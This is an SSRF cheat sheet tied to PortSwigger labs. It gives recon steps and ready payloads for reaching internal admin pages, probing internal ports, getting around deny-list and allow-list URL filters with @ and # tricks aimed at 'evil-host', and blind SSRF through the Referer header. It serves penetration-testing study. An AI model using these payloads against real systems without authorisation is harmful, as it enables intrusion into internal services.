# Server-side Request Forgery (SSRF)

## Summary

* [Recon for SSRF](#recon)

* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)


## Recon

### Identify SSRF

* Identify any request parameters that appear to contain hostnames, IP addresses or full/partial URLs

* Modify each parameter’s value to specify another resource, similar to the one requested, and see if it appears in the response

* Try to specify a URL resource that you control out on the internet and monitor it for any connections.  If no connections are received monitor the time taken for the application to respond, if there is a delay it could be a time-out connection due to network restrictions


## Cheat Sheet

**If we find an interesting parameter that contains hostnames, IP addresses or full URLs, the following payloads can help to identify SSRF:**


### Access Control Bypass


* Use a localhost or valid internal IP address, through a SSRF vector, to potentially bypass access controls implemented on sensitive resources on the application that only allow access to admin users or through a specific IP address/network-interface:

```
http://localhost/admin
```
```
http://192.168.0.5:8080/admin
```


### Resource Enumeration


* Change the parameter value to another resource and analyze how the application responds.  We can probe for port numbers, internal IP addresses, different hostnames, and analyze the application’s responses.  

* Ideally, we should know how the application responds to a valid vs invalid specified resources, so we can easily determine when an injected value is valid:


```
http://192.168.0.1:22
```
```
http://192.168.0.1:8080
```


### Bypasses for disallow-list filter

* If the application is blocking requests for http://127.0.0.1 and /admin resources, we can try the following bypass techniques:

#### Other representations for 127.0.0.1:

```
http://127.1
```

#### URL Encoding:

```
%68%74%74%70%3a%2f%2f%31%32%37%2e%31
```


#### Obfuscation/Case Variation:

```
http://127.0.0.1/AdMiN
```



### Bypasses for allow-list filter

* If the application is only checking that a specific host is somewhere within the parameter, we can bypass this restriction with the following payloads:

#### Embed credentials @ in a URL before hostname:

```
https://expected-host@evil-host
```

#### \# character specifies a URL fragment:  

```
https://evil-host#expected-host
```


#### Complex method to bypass allow list restrictions (try to encode/double-encode the \#/@ characters too):

```
https://evil-host#evil-host@expected-host/evil-path
```
```
https://expected-host@evil-host/evil-path#
```


### Blind SSRF

* If the application does not return any notable differences in the responses from our SSRF payloads, then we can use Blind SSRF techniques:

* Inject a payload that will trigger an HTTP connection to a domain that you control and monitor for any network traffic.

* Inject this payload in all susceptible parameters and headers (Referer):
    * Example:  Referer: https://burp-collab.net



### SSRF via Open Redirection

* https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection